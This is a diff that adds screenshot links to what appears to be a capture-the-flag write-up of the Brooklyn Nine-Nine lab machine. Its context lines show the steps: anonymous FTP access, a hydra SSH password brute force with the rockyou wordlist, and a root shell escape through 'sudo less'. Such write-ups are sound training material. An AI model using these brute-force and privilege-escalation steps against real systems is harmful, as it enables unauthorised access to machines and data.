@@ -36,6 +36,8 @@ Three open ports were identified:
 | 22/tcp | SSH | OpenSSH 7.6p1 |
 | 80/tcp | HTTP | Apache 2.4.29 |
 
+![Nmap scan output](/assets/screenshots/brooklyn99/nmap.png)
+
 ### Anonymous FTP Access
 
 Connected to the FTP server with anonymous credentials:
@@ -51,6 +53,8 @@ Inside, a single file was present:
 ```
 -rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
 ```
+
+![FTP login with note_to_jake.txt](/assets/screenshots/brooklyn99/ftp_login.png)
 
 ### note_to_jake.txt
 
@@ -76,6 +80,8 @@ Using the hint from the note, brute-forced SSH for user `jake` with the `rockyou
 hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.48.150.210 ssh
 ```
 
+![Hydra brute force result](/assets/screenshots/brooklyn99/hydra_result.png)
+
 Hydra quickly found the password and returned the credentials.
 
 ### SSH as Jake
@@ -88,6 +94,8 @@ ssh jake@10.48.150.210
 
 ### User Flag
 
+![User flag captured](/assets/screenshots/brooklyn99/user_flag.png)
+
 ```bash
 jake@brookly_nine_nine:~$ cat user.txt
 ```
@@ -99,6 +107,8 @@ Checked sudo permissions:
 ```bash
 jake@brookly_nine_nine:~$ sudo -l
 ```
+
+![sudo -l output showing less privilege](/assets/screenshots/brooklyn99/sudo_privilege.png)
 
 Output showed that `jake` could run `/usr/bin/less` as root without a password:
 
@@ -116,6 +126,8 @@ sudo less /etc/profile
 Inside `less`, typed `!/bin/sh` to spawn a root shell.
 
 ### Root Flag
+
+![Root flag captured](/assets/screenshots/brooklyn99/root_flag.png)
 
 ```bash
 cat /root/root.txt
